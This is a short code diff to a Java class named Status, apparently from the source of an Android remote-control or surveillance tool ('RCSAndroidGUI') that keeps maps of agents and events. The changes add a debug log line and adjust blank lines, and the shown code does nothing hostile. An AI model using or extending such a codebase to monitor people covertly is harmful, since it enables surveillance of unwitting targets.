@@ -27,7 +27,6 @@ import com.ht.RCSAndroidGUI.util.Check;
  * The Class Status.
  */
 public class Status {
-
 	private static final String TAG = "Status";
 
 	/** The agents map. */
@@ -150,6 +149,7 @@ public class Status {
 	 *             the RCS exception
 	 */
 	public void addEvent(final EventConf e) throws RCSException {
+		Log.d("QZ", TAG + " addEvent ");
 		// Don't add the same event twice
 		if (eventsMap.containsKey(e.getId()) == true) {
 			//throw new RCSException("Event " + e.getId() + " already loaded");
@@ -523,4 +523,5 @@ public class Status {
 	public void setRestarting(boolean b) {
 		// TODO Auto-generated method stub
 	}
+
 }
